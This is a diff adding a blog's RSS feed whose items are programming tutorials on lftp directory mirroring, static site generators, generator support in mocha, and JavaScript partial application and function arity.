@@ -1,0 +1,1046 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:wfw="http://wellformedweb.org/CommentAPI/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Wojciech L-Łapiński</title>
+    <atom:link href="http://www.armblog.pl/feed.xml" rel="self" type="application/rss+xml"></atom:link>
+    <link>http://www.armblog.pl</link>
+    <description>My thoughts materialised into a blog</description>
+    <pubDate>Wed, 26 Feb 2014 12:59:54 +0100</pubDate>
+    <generator>Wintersmith - https://github.com/jnordberg/wintersmith</generator>
+    <language>en</language>
+    <item>
+      <title>Szybki download/upload katalogów poprzez FTP</title>
+      <link>http://www.armblog.pl/articles/jak-szybko-wysylac-lub-sciagac-katalogi-przez-ftp/</link>
+      <pubDate>Wed, 26 Feb 2014 12:59:54 +0100</pubDate>
+      <guid isPermaLink="true">http://www.armblog.pl/articles/jak-szybko-wysylac-lub-sciagac-katalogi-przez-ftp/</guid>
+      <author></author>
+      <description>&lt;p&gt;Najszybszą metodą przesyłania i ściągania całej gałęzi katalogów poprzez FTP, używając poleceń z konsoli, jest wykorzystanie programu &lt;a href=&quot;http://lftp.yar.ru/&quot; title=&quot;lftp&quot;&gt;lftp&lt;/a&gt; .&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;lftp&lt;/em&gt; jest rozbudowanym programem do transmisji plików, który obsługuje protokoły takie jak ftp/s, http/s, hftp, fish, sftp i torrent. Warto ten program zainstalować, gdyż może być wielce pomocny w niektórych sytuacjach.&lt;/p&gt;
+&lt;p&gt;Poniżej przykład wysyłania zawartości lokalnego katalogu &lt;em&gt;‘local_dir’&lt;/em&gt; do zdalnego &lt;em&gt;‘remote_dir’&lt;/em&gt; na serwerze &lt;em&gt;‘hostname’&lt;/em&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;$ lftp -u user,password &lt;span class=&quot;operator&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;mirror -R local_dir /remote_dir;quit&quot;&lt;/span&gt; ftp://hostname
+Total: &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; directory, &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; files, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; symlinks
+New: &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; files, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; symlinks
+&lt;span class=&quot;number&quot;&gt;20071573&lt;/span&gt; bytes transferred &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;162&lt;/span&gt; seconds (&lt;span class=&quot;number&quot;&gt;121.8&lt;/span&gt;K/s)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Żeby zobaczyć zawartość zdalnego katalogu &lt;em&gt;‘remote_dir’&lt;/em&gt; na serwerze &lt;em&gt;‘hostname’&lt;/em&gt; wykonujemy polecenie:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;$ lftp -u user,password &lt;span class=&quot;operator&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;ls /remote_dir;quit&quot;&lt;/span&gt; ftp://hostname
+total &lt;span class=&quot;number&quot;&gt;19612&lt;/span&gt;
+-rw-r--r--  &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; nobody  nogroup  &lt;span class=&quot;number&quot;&gt;15568717&lt;/span&gt; Feb &lt;span class=&quot;number&quot;&gt;25&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;23&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;29&lt;/span&gt; eGroup.zip
+-rw-r--r--  &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; nobody  nogroup    &lt;span class=&quot;number&quot;&gt;113942&lt;/span&gt; Feb &lt;span class=&quot;number&quot;&gt;25&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;23&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;29&lt;/span&gt; eGroup-pear.zip
+-rw-r--r--  &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; nobody  nogroup   &lt;span class=&quot;number&quot;&gt;4388914&lt;/span&gt; Feb &lt;span class=&quot;number&quot;&gt;25&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;23&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;30&lt;/span&gt; wordpress.zip
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Dla ściągnięcia zawartości zdalnego katalogu &lt;em&gt;‘remote_dir’&lt;/em&gt; z serwera &lt;em&gt;‘hostname’&lt;/em&gt; na katalog lokalny &lt;em&gt;‘local_dir’&lt;/em&gt; wykonujemy polecenie:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;$ lftp -u user,password &lt;span class=&quot;operator&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;mirror /remote_dir local_dir;quit&quot;&lt;/span&gt; ftp://hostname
+Total: &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; directory, &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; files, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; symlinks
+New: &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; files, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; symlinks
+&lt;span class=&quot;number&quot;&gt;20071573&lt;/span&gt; bytes transferred &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;20&lt;/span&gt; seconds (&lt;span class=&quot;number&quot;&gt;981.0&lt;/span&gt;K/s)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;To tylko najbardziej użyteczne przykłady korzystania z programu &lt;a href=&quot;http://lftp.yar.ru/&quot; title=&quot;lftp&quot;&gt;lftp&lt;/a&gt;. Warto dokładnie przejrzeć manual na stronie producenta i zapoznać się z szeregiem innych ciekawych opcji (jak np. możliwość równoległego wysyłania i ściągania plików).&lt;/p&gt;
+</description>
+    </item>
+    <item>
+      <title>Potrzeba Statycznego Generatora Stron ?!</title>
+      <link>http://www.armblog.pl/articles/move-to-static-site-generator/</link>
+      <pubDate>Mon, 17 Feb 2014 00:00:00 +0100</pubDate>
+      <guid isPermaLink="true">http://www.armblog.pl/articles/move-to-static-site-generator/</guid>
+      <author></author>
+      <description>&lt;p&gt;Writing has always been a part of what I do.  I’ve had a chance to blog for sites like &lt;a href=&quot;http://mashable.com/&quot; target=&quot;_blank&quot;&gt;Mashable&lt;/a&gt;, &lt;a href=&quot;http://www.appolicious.com/&quot; target=&quot;_blank&quot;&gt;Appolicious&lt;/a&gt;, and the &lt;a href=&quot;http://www.adobe.com/inspire.html&quot; target=&quot;_blank&quot;&gt;Adobe Inspire Magazine&lt;/a&gt;.  That being said, my primary goal has been to have a quality personal blog with fresh content that is added regularly.  However, that hasn’t always happened since over blog maintenance kept getting in my way.  I wanted to find the best way to create a blog that required minimal maintenance of the engine and also allowed me to write content quickly and easily while also rapdily iterating on the design and structure.  &lt;/p&gt;
+&lt;p&gt;This led me down a path of completely redoing everything about my personal site.  In this series I will outline all of my decisions and the technologies I chose.  In this first article, I will give some background information and outline my decision process for choosing a static site generator.  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;All code for my new site is &lt;a href=&quot;https://github.com/davidtucker/davidtucker-blog&quot; target=&quot;_blank&quot;&gt;available on Github&lt;/a&gt; and is being released under an MIT License.  You can feel free to use as you see fit.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&quot;the-backstory&quot;&gt;The Backstory&lt;/h2&gt;
+&lt;p&gt;To give you some insight on why I chose to utilize a static site generator, I have to give you a short history of my blogging and the platforms I have used.  Don’t worry, this will be short and relatively painless.&lt;/p&gt;
+&lt;h3 id=&quot;wordpress&quot;&gt;Wordpress&lt;/h3&gt;
+&lt;p&gt;When I first put up a blog at davidtucker.net, it was powered by &lt;a href=&quot;http://wordpress.org/&quot; target=&quot;_blank&quot;&gt;Wordpress&lt;/a&gt;.  If my memory serves me correctly this was back around 2007.  Wordpress is obviously a quality blogging platform, and since I was doing PHP development at that time, it made sense.  However, a few big problems became evident over the years I used Wordpress:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Wordpress requires maintenance.  Updates need to be installed immediately because Wordpress vulnerabilities are targeted by hackers (and often).&lt;/li&gt;
+&lt;li&gt;Wordpress also required server maintenance.  I’ve generally always managed a personal Linux server, and I was managing a personal LAMP stack server on which my blog ran.  In many cases I was hacked because of a vulnerability in my server setup (I recall three hacks specifically during my early days of using Wordpress before I knew how to fully harden Apache for Wordpress use).&lt;/li&gt;
+&lt;li&gt;Wordpress templates mix too much presentation and logic in the same code.  As I grew into a more seasoned developer, I began to realize the problems that this created.  Every time I would work on a new design for my blog, I would quickly realize the huge amount of time it took to take a completed design idea which was in HTML, CSS, and JS and make it into a workable template for Wordpress.&lt;/li&gt;
+&lt;li&gt;Wordpress is a blogging engine with pre-defined types (yes, I realize this has changed since then).  This is fine for sites that are just blogs, but if you want it to manage other types of content or add other content properties you had to fit a square peg into a round hole.  That certainly isn’t to say it could not be done, but in those earlier days of Wordpress it always felt like a bad hack to get those other properties included and referenced within the templates.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;It didn’t take long for me to realize that these elements were truly limiting my ability to blog regularly and to rapidly iterate on some elements within my blog’s structure.  I needed to find something that fit me better.&lt;/p&gt;
+&lt;h3 id=&quot;expression-engine&quot;&gt;Expression Engine&lt;/h3&gt;
+&lt;p&gt;Next, I took a much more traditional content management approach.  I had known about &lt;a href=&quot;http://ellislab.com/expressionengine&quot; target=&quot;_blank&quot;&gt;Expression Engine&lt;/a&gt; (EE) for some time, and I had tried it for some other sites I was working on.   Right out of the gate there were some big benefits:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;EE provided a true type-based content management system.  This allows me to model my own data types and have them reflected properly in my site.&lt;/li&gt;
+&lt;li&gt;EE had a much cleaner separation between the presentation and logic layers.  It wasn’t perfect, but it was miles ahead of Wordpress.  This made it very easy to iterate on my site’s design and structure.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;I purchased an EE license, and had it deployed relatively quickly.  For a while, my blogging increased, but then the other problems reemerged.  I still had the problem of both server maintenance as well as maintaining the Expression Engine version.  I stopped counting how many times I went to write a blog post only to discover that I needed to update a version of something or change a configuration.  This utterly destroyed my blogging productivity.&lt;/p&gt;
+&lt;h3 id=&quot;a-better-way&quot;&gt;A Better Way&lt;/h3&gt;
+&lt;p&gt;It was at this point that I took note that most all of my site was static.  The only dynamic element that I was utilizing was commenting, and frankly I didn’t care about commenting (and there were client side options like &lt;a href=&quot;http://disqus.com/&quot; target=&quot;_blank&quot;&gt;Disqus&lt;/a&gt; that I could leverage if I needed it).  When I finally came to this conclusion, I knew I was going to choose a static site generator and deploy it on a cloud service like &lt;a href=&quot;http://aws.amazon.com/s3/&quot; target=&quot;_blank&quot;&gt;Amazon S3&lt;/a&gt; or &lt;a href=&quot;http://www.rackspace.com/cloud/files/&quot; target=&quot;_blank&quot;&gt;Rackspace CloudFiles&lt;/a&gt;.&lt;/p&gt;
+&lt;h2 id=&quot;choosing-a-static-site-generator&quot;&gt;Choosing a Static Site Generator&lt;/h2&gt;
+&lt;p&gt;Once I realized that I needed to adopt a static site generator, I began to survey the landscape.  In my search, certain generators rose to the top like &lt;a href=&quot;http://jekyllrb.com/&quot; target=&quot;_blank&quot;&gt;Jekyll&lt;/a&gt;, &lt;a href=&quot;http://hammerformac.com/&quot; target=&quot;_blank&quot;&gt;Hammer&lt;/a&gt;, and &lt;a href=&quot;http://middlemanapp.com/&quot; target=&quot;_blank&quot;&gt;Middleman&lt;/a&gt;.  To determine the best one for me, I evaluated them based off of certain criteria:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;It needed to be using a technology I am very familiar with so that I can extend and customize as needed.  I knew that this meant that it would probably not be one of the popular generators as many of them are Ruby-based (and Ruby isn’t my area of expertise).&lt;/li&gt;
+&lt;li&gt;It needed to be open source so that I could contribute to the core project.&lt;/li&gt;
+&lt;li&gt;It needed to provide a workflow that could be easily automated and potentially tie in well with tools for this like Grunt JS.&lt;/li&gt;
+&lt;li&gt;It needed to be command line driven.  I wasn’t interested in using an &lt;em&gt;all-in-one&lt;/em&gt; GUI approach as I felt that could limit customization.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;I know several people who have chosen &lt;a href=&quot;http://pages.github.com/&quot; target=&quot;_blank&quot;&gt;Github Pages&lt;/a&gt; (which optionally can utilize Jekyll), and it obviously was an area that I checked out early on.  Since its static site generator is powered by Jekyll, I decided it was not an option (just solely because as mentioned before I don’t do a ton of Ruby work).  In addition, there are some limiting factors on what you can do with Jekyll on Github Pages (since you don’t really control the static generator but instead leave that to Github Pages).&lt;/p&gt;
+&lt;p&gt;With that being said, I continued to look as I felt that none of the early options really met all of my criteria.&lt;/p&gt;
+&lt;h3 id=&quot;wintersmith&quot;&gt;Wintersmith&lt;/h3&gt;
+&lt;p&gt;When I researched Node JS static site generators &lt;a href=&quot;https://github.com/jnordberg/wintersmith&quot; target=&quot;_blank&quot;&gt;Wintersmith&lt;/a&gt; (created by &lt;a href=&quot;https://github.com/jnordberg&quot; target=&quot;_blank&quot;&gt;Johan Nordberg&lt;/a&gt;) quickly rose to the top.  I did some initial research, and within thirty minutes I realized it would fit my needs well.  It met my earlier criteria (for the most part) and provided a few examples that I could run with.&lt;/p&gt;
+&lt;p&gt;My main issue with the examples were that they were all done with Jade as the templating engine.  I have worked with Jade before, and I’m not a big fan of it (which I realize is a discussion for another day), however I also knew that Wintersmith had a plugin API for templating.  I assumed I could find something that would work well.  After some initial investigation I settled on &lt;a href=&quot;http://nunjucks.jlongster.com/&quot; target=&quot;_blank&quot;&gt;nunjucks&lt;/a&gt; and the &lt;a href=&quot;https://github.com/jbuck/wintersmith-nunjucks&quot; target=&quot;_blank&quot;&gt;wintersmith-nunjucks&lt;/a&gt; plugin by &lt;a href=&quot;https://github.com/jbuck&quot; target=&quot;_blank&quot;&gt;John Buckley&lt;/a&gt;.  Nunjucks is based on the &lt;a href=&quot;http://jinja.pocoo.org/&quot; target=&quot;_blank&quot;&gt;jinja2&lt;/a&gt; templating engine in python and it also had similarities to Expression Engine’s templates.   In both cases it allowed for the clean separation of the presentation and logic layers.  &lt;/p&gt;
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;With these elements in place, I was able to move forward to building the first version of my new site.  In the upcoming posts in this series I will outline my development process, technical choices, and even my deployment choices and process.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;a name=&quot;seriesListing&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;article-series&quot;&gt;Article Series&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Part 1 - &lt;a href=&quot;http://www.armblog.pl/articles/move-to-static-site-generator/&quot;&gt;The Need for a Static Site Generator&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Part 2 - &lt;a href=&quot;http://www.armblog.pl/articles/introduction-to-wintersmith/&quot;&gt;An Introduction to the Wintersmith Process&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Part 3 - &lt;a href=&quot;http://www.armblog.pl/articles/automating-with-grunt/&quot;&gt;Automating The Development, Build, and Deployment Process with Grunt&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;More posts coming soon&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    <item>
+      <title>Enabling Generators in Mocha</title>
+      <link>http://www.armblog.pl/articles/mocha-test-harmony-generators/</link>
+      <pubDate>Tue, 04 Feb 2014 12:30:00 +0100</pubDate>
+      <guid isPermaLink="true">http://www.armblog.pl/articles/mocha-test-harmony-generators/</guid>
+      <author></author>
+      <description>&lt;p&gt;For the last week, I’ve been working on a new project that uses node 0.11 and generators. Aside from the numerous benefits with generators in the application, I also integrated generators into my test suite. By using &lt;a href=&quot;http://visionmedia.github.io/mocha/&quot;&gt;mocha&lt;/a&gt; and &lt;a href=&quot;https://github.com/visionmedia/co&quot;&gt;co&lt;/a&gt;, you can also enable support for generator functions in your test suite.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; co       = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;'co'&lt;/span&gt;);
+&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; mocha    = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;'mocha'&lt;/span&gt;);
+&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; Runnable = mocha.Runnable;
+&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; run      = Runnable.prototype.run;
+
+&lt;span class=&quot;comment&quot;&gt;/**
+ * Override the Mocha function runner and enable generator support with co.
+ *
+ * @param {Function} fn
+ */&lt;/span&gt;
+Runnable.prototype.run = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(fn)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.fn.constructor.name === &lt;span class=&quot;string&quot;&gt;'GeneratorFunction'&lt;/span&gt;) {
+    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.fn   = co(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.fn);
+    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.sync = !(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.async = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;);
+  }
+
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; run.call(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;, fn);
+};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Save the snippet of code above into a JavaScript file and pass the filename to &lt;code&gt;mocha.opts&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mocha --harmony-generators --require test/support/co-mocha
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Writing tests using generators has made testing even more enjoyable, so I decided to release the &lt;a href=&quot;https://github.com/blakeembrey/co-mocha&quot;&gt;code on Github&lt;/a&gt; with some accompanying tests and test coverage.&lt;/p&gt;
+</description>
+    </item>
+    <item>
+      <title>Partial Application in JavaScript</title>
+      <link>http://www.armblog.pl/articles/partial-application-in-javascript/</link>
+      <pubDate>Sat, 25 Jan 2014 23:00:00 +0100</pubDate>
+      <guid isPermaLink="true">http://www.armblog.pl/articles/partial-application-in-javascript/</guid>
+      <author></author>
+      <description>&lt;p&gt;Partial application is the act of pre-filling arguments of a function and returning a new function of smaller arity. The returned function can be called with additional parameters and in JavaScript, the &lt;code&gt;this&lt;/code&gt; context can also be changed when called. Using a partially applied function is extremely common in functional programming with JavaScript as it allows us to compose some really nifty utilities and avoid repeating ourselves in code.&lt;/p&gt;
+&lt;p&gt;In modern JavaScript engines, there is a &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/bind&quot;&gt;bind function&lt;/a&gt; which can be used to achieve a similar result. The difference between &lt;code&gt;partial&lt;/code&gt; and &lt;code&gt;bind&lt;/code&gt; is that the a partial functions &lt;code&gt;this&lt;/code&gt; context is set when the returned function is called, while a bound functions &lt;code&gt;this&lt;/code&gt; context has already been defined and can’t be changed.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; __slice = &lt;span class=&quot;built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice;
+
+&lt;span class=&quot;comment&quot;&gt;/**
+ * Wrap a function with default arguments for partial application.
+ *
+ * @param  {Function} fn
+ * @param  {*}        ...
+ * @return {Function}
+ */&lt;/span&gt;
+&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; partial = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(fn &lt;span class=&quot;comment&quot;&gt;/*, ...args */&lt;/span&gt;)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; args = __slice.call(&lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);
+
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; {&lt;/span&gt;
+    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; fn.apply(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;, args.concat(__slice.call(&lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;)));
+  };
+};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;From the function above, we can understand that &lt;code&gt;partial&lt;/code&gt; accepts the function to be pre-filled and it’s default arguments. It then returns a new function which can be called with some more arguments. It’s important to note that the context (&lt;code&gt;this&lt;/code&gt;) is being defined when the returned function is called. But when would you even want to use this?&lt;/p&gt;
+&lt;p&gt;Normally I would be happy to give a simple example of transforming an &lt;code&gt;add&lt;/code&gt; function into an &lt;code&gt;add5&lt;/code&gt; by partially applying it - &lt;code&gt;partial(add, 5)&lt;/code&gt;. This definitely demonstates how we can use the utility, but doesn’t really touch on why.&lt;/p&gt;
+&lt;p&gt;Consider writing a logging utility that accepts some different arguments that need to be logged - &lt;code&gt;var log = function (type, value) {}&lt;/code&gt;. Fantastic, it looks like a really simple function to use. But now we want set every log in our file to the &lt;code&gt;testing&lt;/code&gt; type. We can do a couple of things to achieve this. One option would be to assign our type to a variable and reuse the variable  - &lt;code&gt;var testType = &amp;#39;Testing&amp;#39;&lt;/code&gt; and &lt;code&gt;log(testType, value)&lt;/code&gt;. This will get messy after we write it more than once. What if we just wrapped the &lt;code&gt;log&lt;/code&gt; function automatically?&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; testLog = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; log.apply(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;, [&lt;span class=&quot;string&quot;&gt;'testing'&lt;/span&gt;].concat(__slice.call(&lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;)));
+};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Great, this looks familiar - we could have just used partial - &lt;code&gt;var testLog = partial(log, &amp;#39;Testing&amp;#39;)&lt;/code&gt;. Now we have a function we can continue to reuse any number of times without fear of repeating ourselves.&lt;/p&gt;
+&lt;h2 id=&quot;bonus-points&quot;&gt;Bonus Points&lt;/h2&gt;
+&lt;p&gt;If you’ve been reading any of my previous blog posts, you may have noticed me abusing the usefulness of &lt;a href=&quot;http://blakeembrey.com/articles/forcing-function-arity-in-javascript/&quot;&gt;function arity&lt;/a&gt; in anonymously returned functions. And in another article I wrote about a utility that can help us remove the &lt;a href=&quot;http://blakeembrey.com/articles/javascript-variadic-function/&quot;&gt;repetitive argument slicing&lt;/a&gt;. If you haven’t checked out these utilities yet, take a quick look and I bet you’ll see how we could use them here.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; partial = variadic(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(fn, args)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; remaining = &lt;span class=&quot;built_in&quot;&gt;Math&lt;/span&gt;.max(fn.length - args.length, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);
+
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; arity(remaining, variadic(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(called)&lt;/span&gt; {&lt;/span&gt;
+    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; fn.apply(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;, args.concat(called));
+  }));
+});
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now the returned partially applied function gives us the correct number of trailing arguments still to be filled using the &lt;code&gt;arity&lt;/code&gt; utility. On top of that, we managed to get rid of slicing arguments constantly by using the &lt;code&gt;variadic&lt;/code&gt; utility. In fact, I’ve been so interested in these reusable utilities that I published the &lt;a href=&quot;https://github.com/blakeembrey/partial&quot;&gt;partial utility on Github&lt;/a&gt; so I can reuse it later.&lt;/p&gt;
+</description>
+    </item>
+    <item>
+      <title>Forcing Function Arity in JavaScript</title>
+      <link>http://www.armblog.pl/articles/forcing-function-arity-in-javascript/</link>
+      <pubDate>Wed, 22 Jan 2014 23:30:00 +0100</pubDate>
+      <guid isPermaLink="true">http://www.armblog.pl/articles/forcing-function-arity-in-javascript/</guid>
+      <author></author>
+      <description>&lt;p&gt;Function arity in something in JavaScript that is usually overlooked. For the most part, that’s perfectly understandable, it’s just a number. Unfortunately, this number can be integral to many other functions working correctly. But first, what number am I talking about?&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; fn = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(a, b)&lt;/span&gt; {&lt;/span&gt;};
+
+fn.length; &lt;span class=&quot;comment&quot;&gt;//=&amp;gt; 2&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;As you can see, the length gives up the exact number of arguments the function is expecting to be passed in. This can be useful for other functions that might want to alter its behaviour based on this digit. For example, I found outlining this issue &lt;a href=&quot;http://raganwald.com/2013/03/21/arity-and-partial-function-application.html&quot;&gt;with currying&lt;/a&gt;. Basically, the &lt;code&gt;curry&lt;/code&gt; function implementation relies on using the arity information to know how many times the function needs to be curried.&lt;/p&gt;
+&lt;p&gt;To force the number of arity in our returned anonymous functions, we need to dynamically generate a function with the specified number of arguments. Why? Because the previous implementations of &lt;a href=&quot;http://blakeembrey.com/articles/wrapping-javascript-functions/&quot;&gt;wrapping functions&lt;/a&gt;, &lt;a href=&quot;http://blakeembrey.com/articles/javascript-bind-function/&quot;&gt;bind&lt;/a&gt;, &lt;a href=&quot;http://blakeembrey.com/articles/javascript-variadic-function/&quot;&gt;variadic&lt;/a&gt; and every other functional utility I have demonstrated don’t proxy the number of arguments through the returned function.&lt;/p&gt;
+&lt;p&gt;This can be a problem in the case where we want to use this function somewhere that expects a function length to work correctly, like when currying. We could fix this at the source, a half a dozen times and any number of times more. Or we could write a little utility that will enfore a number of arguments for us.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; names   = &lt;span class=&quot;string&quot;&gt;'abcdefghijklmnopqrstuvwxyz'&lt;/span&gt;;
+&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; __slice = &lt;span class=&quot;built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice;
+
+&lt;span class=&quot;comment&quot;&gt;/**
+ * Make a function appear as though it accepts a certain number of arguments.
+ *
+ * @param  {Number}   length
+ * @param  {Function} fn
+ * @return {Function}
+ */&lt;/span&gt;
+&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; arity = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(length, fn)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;eval&lt;/span&gt;(
+    &lt;span class=&quot;string&quot;&gt;'(function ('&lt;/span&gt; + __slice.call(names, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, length).join(&lt;span class=&quot;string&quot;&gt;','&lt;/span&gt;) + &lt;span class=&quot;string&quot;&gt;') {\n'&lt;/span&gt; +
+    &lt;span class=&quot;string&quot;&gt;'return fn.apply(this, arguments);\n'&lt;/span&gt; +
+    &lt;span class=&quot;string&quot;&gt;'})'&lt;/span&gt;
+  );
+};
+&lt;/code&gt;&lt;/pre&gt;
